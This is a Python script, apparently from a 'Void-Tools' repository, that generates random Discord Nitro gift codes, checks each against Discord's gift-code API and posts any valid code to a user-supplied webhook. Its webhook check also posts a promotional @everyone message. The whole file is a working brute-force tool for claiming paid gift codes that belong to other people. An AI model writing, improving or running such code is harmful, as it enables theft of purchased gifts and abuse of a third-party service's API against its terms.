import random
import string
import json
import requests
from colorama import Fore, init


init(autoreset=True)

def error_message(error):
    """Display an error message."""
    print(Fore.RED + f"Error: {error}")

def verify_webhook(url):
    """Verify if the webhook is valid and send a test message."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            payload = {
                'content': """# Void-Nitro-Gen

                
                
> __**Your webhook is awork you can start generating nitro!**__

> https://discord.gg/W6z9SQgvqc

> https://github.com/void4real/Void-Tools

> __Star for more features <3__

||@everyone||"""
            }
            headers = {
                'Content-Type': 'application/json'
            }
            requests.post(url, data=json.dumps(payload), headers=headers)
            return True
        else:
            error_message("Invalid Webhook URL")
            return False
    except requests.exceptions.RequestException as e:
        error_message(f"Error verifying webhook: {e}")
        return False

def send_webhook(embed_content, webhook_url, webhook_username, webhook_avatar):
    """Send a notification to the webhook."""
    payload = {
        'embeds': [embed_content],
        'username': webhook_username,
        'avatar_url': webhook_avatar
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    except requests.exceptions.RequestException as e:
        error_message(f"Error sending to webhook: {e}")

def verify_nitro_code(webhook, webhook_url, webhook_username, webhook_avatar, webhook_color):
    """Verify if a Discord Nitro code is valid."""
    code_nitro = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    url_nitro = f'https://discord.gift/{code_nitro}'
    try:
        response = requests.get(f'https://discord.com/api/v9/entitlements/gift-codes/{code_nitro}?with_application=false&with_subscription_plan=true', timeout=5)
        if response.status_code == 200:
            embed_content = {
                'title': 'Valid Nitro!',
                'description': f"**__Nitro:__**\n```{url_nitro}```",
                'color': webhook_color,
                'footer': {
                    "text": webhook_username,
                    "icon_url": webhook_avatar,
                }
            }
            if webhook:
                send_webhook(embed_content, webhook_url, webhook_username, webhook_avatar)
            print(Fore.GREEN + f"[+] Valid | Nitro: {url_nitro}")
        else:
            print(Fore.RED + f"[-] Invalid | Nitro: {url_nitro}")
    except requests.exceptions.ReadTimeout:
        error_message("Request timeout expired")
    except requests.exceptions.RequestException as e:
        error_message(f"Error verifying Nitro code: {e}")

def generate_nitros(num_nitros, webhook, webhook_url, webhook_username, webhook_avatar, webhook_color):
    """Generate and verify the specified number of Nitro codes."""
    for _ in range(num_nitros):
        verify_nitro_code(webhook, webhook_url, webhook_username, webhook_avatar, webhook_color)

def main():
    try:
        use_webhook = input(Fore.RED + "[?] Use a Webhook? (y/n) -> ").strip().lower() in ['y', 'yes']
        if use_webhook:
            webhook_url = input(Fore.RED + "[?] Webhook URL -> ").strip()
            if not verify_webhook(webhook_url):
                return
            webhook_username = "Nitro Generator"
            webhook_avatar = "https://example.com/avatar.png"
            webhook_color = 0x00ff00
        else:
            webhook_url = webhook_username = webhook_avatar = webhook_color = None

        num_nitros = int(input(Fore.RED + "[?] How many Nitro codes do you want to generate? -> ").strip())

    except Exception as e:
        error_message(e)
        return

    try:
        generate_nitros(num_nitros, use_webhook, webhook_url, webhook_username, webhook_avatar, webhook_color)
    except Exception as e:
        error_message(e)

if __name__ == "__main__":
    main()

